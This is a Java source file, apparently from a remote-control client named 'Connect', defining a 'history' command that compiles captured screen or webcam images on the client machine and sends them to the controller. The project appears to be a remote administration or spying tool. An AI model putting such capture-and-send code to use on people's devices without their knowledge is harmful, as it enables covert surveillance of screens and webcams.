package br.com.introcdc.connect.client.commands.image;
/*
 * Written by IntroCDC, Bruno Coêlho at 15/01/2025 - 17:27
 */

import br.com.introcdc.connect.Connect;
import br.com.introcdc.connect.client.ConnectClient;
import br.com.introcdc.connect.client.command.ClientCommand;
import br.com.introcdc.connect.client.components.ClientImageComponents;

import java.awt.image.BufferedImage;
import java.util.ArrayList;

public class ClientCommandHistory extends ClientCommand {

    public ClientCommandHistory() {
        super("history");
    }

    @Override
    public void execute(String command, String input) throws Exception {
        if (input.equalsIgnoreCase("screen") || input.equalsIgnoreCase("webcam")) {
            java.util.List<BufferedImage> history = new ArrayList<>(input.equalsIgnoreCase("screen") ? ClientImageComponents.SCREEN_HISTORY : ClientImageComponents.WEBCAM_HISTORY);
            if (history.isEmpty()) {
                msg("O histórico de " + (input.equalsIgnoreCase("screen") ? "tela" : "webcam") + " está vazio!");
                return;
            }
            try {
                BufferedImage image = ClientImageComponents.createHistoryImage(history);
                msg("view-image");
                ConnectClient.EXECUTOR.schedule(ConnectClient.runnable(() -> ClientImageComponents.sendImage(5, image)), Connect.DELAY, Connect.DELAY_TYPE);
            } catch (Exception exception) {
                msg("Ocorreu um erro ao enviar a imagem do histórico da " + (input.equalsIgnoreCase("screen") ? "tela" : "webcam") + "! (" + exception.getMessage() + ")");
                exception(exception);
            }
        } else {
            msg("Tipo inválido, digite: screen ou webcam!");
        }
    }

}
